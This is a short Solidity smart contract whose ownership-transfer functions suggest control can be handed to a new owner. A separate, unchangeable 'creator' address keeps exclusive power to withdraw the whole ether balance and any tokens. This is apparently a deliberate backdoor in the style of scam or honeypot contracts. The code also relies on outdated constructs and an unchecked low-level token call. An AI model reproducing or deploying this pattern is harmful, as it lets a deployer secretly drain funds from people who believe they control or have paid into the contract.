contract Base 
{
    address newOwner;
    address owner = msg.sender;
    address creator = msg.sender;
    
    function isOwner()
    internal
    constant
    returns(bool) 
    {
        return owner == msg.sender;
    }
    
    function changeOwner(address addr)
    public
    {
        if(isOwner())
        {
            newOwner = addr;
        }
    }
    
    function confirmOwner()
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    
    function canDrive()
    internal
    constant
    returns(bool)
    {
        return (owner == msg.sender)||(creator==msg.sender);
    }
    
    function WthdrawAllToCreator()
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(this.balance);
        }
    }
    
    function WthdrawToCreator(uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(val);
        }
    }
    
    function WthdrawTo(address addr,uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            addr.transfer(val);
        }
    }
    
    function WithdrawToken(address token, uint256 amount)
    public 
    {
        if(msg.sender==creator)
        {
            token.call(bytes4(sha3("transfer(address,uint256)")),creator,amount); 
        }
    }
}

